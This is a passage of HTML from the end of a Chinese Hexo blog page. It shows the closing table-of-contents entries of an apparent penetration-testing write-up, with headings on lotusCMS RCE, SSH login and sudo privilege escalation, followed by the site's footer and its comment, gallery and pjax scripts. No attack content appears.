href="#web%E7%BD%91%E7%AB%99%E6%8C%87%E7%BA%B9%E6%89%AB%E6%8F%8F"><span class="toc-number">3.1.4.</span> <span class="toc-text">web网站指纹扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.2.</span> <span class="toc-text">3.2 漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#lotusCMS-RCE"><span class="toc-number">3.2.1.</span> <span class="toc-text">lotusCMS-RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ssh%E7%99%BB%E5%BD%95%E7%94%A8%E6%88%B7"><span class="toc-number">3.2.2.</span> <span class="toc-text">ssh登录用户</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">3.2.3.</span> <span class="toc-text">sudo权限提升</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">4.</span> <span class="toc-text">0x04 总结</span></a></li><li class="toc-item toc-level-1"><a class="toc-link"><span class="toc-number">5.</span> <span class="toc-text">0x05 参考文章</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside><div id="shadow-aside"></div></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script type="module">import { init } from 'https://unpkg.com/@waline/client@v2/dist/waline.mjs';
+window.waline = init;
+</script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {if (document.querySelector('#waline'))
+ waline({
+   el: '#waline',
+   dark: ':root[theme-mode="dark"]',
+   serverURL: 'https://waline-blog-iwqdtxise-hybchenxing.vercel.app',
+   path: window.location.pathname,
+ });document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
